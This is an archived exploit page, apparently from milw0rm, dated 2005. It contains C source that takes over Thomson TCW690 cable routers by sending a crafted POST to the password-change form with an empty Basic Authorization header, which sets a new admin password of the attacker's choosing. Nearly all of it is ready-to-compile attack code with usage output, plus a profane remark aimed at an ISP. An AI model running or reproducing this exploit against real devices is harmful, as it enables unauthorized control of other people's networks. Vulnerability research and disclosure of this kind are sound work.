<html>
<head>
<title>Thomson TCW690 POST Password Validation Exploit</title>
<pre>
/*****************************************************************   
*     Thomson TCW690 POST Password Validation exploit
*   
*  Tested with hardware version 2.1 and software version ST42.03.0a 
*  Bug found by: MurDoK &lt;murdok.lnx at gmail.com&gt; 
*  Date: 02.19.2005
*
*	sh-3.00$ gcc mdk_tcw690.c -o tcw690
*	sh-3.00$ ./tcw690 192.168.0.1 123
*	*****************************************
*	Thomson TCW690 POST Password Validation
*	Change password exploit coded by MurDoK
*	*****************************************
*	
*	[1] Connecting...
*	[2] Sending POST request...
*	[3] Done! go to http://192.168.0.1
*	sh-3.00$
*
* fuck AUNA :/
******************************************************************/ 
 
#include &lt;netdb.h&gt; 
 
int i=0, x=0, fd; 
struct sockaddr_in sock; 
struct hostent *he; 

char badcode[1000] = 
&quot;POST /goform/RgSecurity HTTP/1.1\r\n&quot; 
&quot;Connection: Keep-Alive\r\n&quot; 
&quot;User-Agent: Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.4.28) KHTML/3.3.2 (like Gecko)\r\n&quot; 
&quot;Referer: http://192.168.0.1/RgSecurity.asp\r\n&quot; 
&quot;Pragma: no-cache\r\n&quot; 
&quot;Cache-control: no-cache\r\n&quot; 
&quot;Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\r\n&quot; 
&quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n&quot; 
&quot;Accept-Charset: iso-8859-15, utf-8;q=0.5, *;q=0.5\r\n&quot; 
&quot;Accept-Language: es, en\r\n&quot; 
&quot;Host: 192.168.0.1\r\n&quot; 
&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot; 
&quot;Authorization: Basic\r\n&quot; 
&quot;Content-Length: 62\r\n&quot; 
&quot;\r\n&quot;; 
//&quot;Password=hack1&amp;PasswordReEnter=hack1&amp;RestoreFactoryNo=0x00&quot;; 
 
 
int main(int argc, char *argv[]) { 
 
//	system(&quot;clear&quot;); 
	printf(&quot;*****************************************\n&quot;); 
	printf(&quot; Thomson TCW690 POST Password Validation\n&quot;); 
	printf(&quot; Change password exploit coded by MurDoK\n&quot;); 
	printf(&quot;*****************************************\n\n&quot;); 
	
	if(argc&lt;3) { 
		printf(&quot;Usage: %s &lt;router IP&gt; &lt;new_password&gt;\n\n&quot;, argv[0]); 
		exit(1); 
	} 
	 
	fd = socket(AF_INET, SOCK_STREAM, 0); 
	 
	he = gethostbyname(argv[1]); 
	memset((char *) &amp;sock, 0, sizeof(sock)); 
	 
	sock.sin_family = AF_INET; 
	sock.sin_port=htons(80); 
	sock.sin_addr.s_addr=*((unsigned long*)he-&gt;h_addr); 
	 
	printf(&quot;[1] Connecting... \n&quot;); 
	 
	if ((connect(fd, (struct sockaddr *) &amp;sock, sizeof(sock))) &lt; 0) { 
		printf(&quot;ERROR: Can't connect to host!\n&quot;); 
		return 0; 
	} 
 
	strcat(badcode, &quot;Password=&quot;); 
	strcat(badcode, argv[2]); 
	strcat(badcode, &quot;&amp;PasswordReEnter=&quot;); 
	strcat(badcode, argv[2]); 
	strcat(badcode, &quot;&amp;RestoreFactoryNo=0x00&quot;); 
	 
	printf(&quot;[2] Sending POST request...\n&quot;); 
	write(fd, badcode, strlen(badcode)); 

	printf(&quot;[3] Done! go to http://%s\n&quot;, argv[1]); 
	 
	close(fd); 
	 
return 1; 
}</pre>
// milw0rm.com [2005-02-19]
</html>

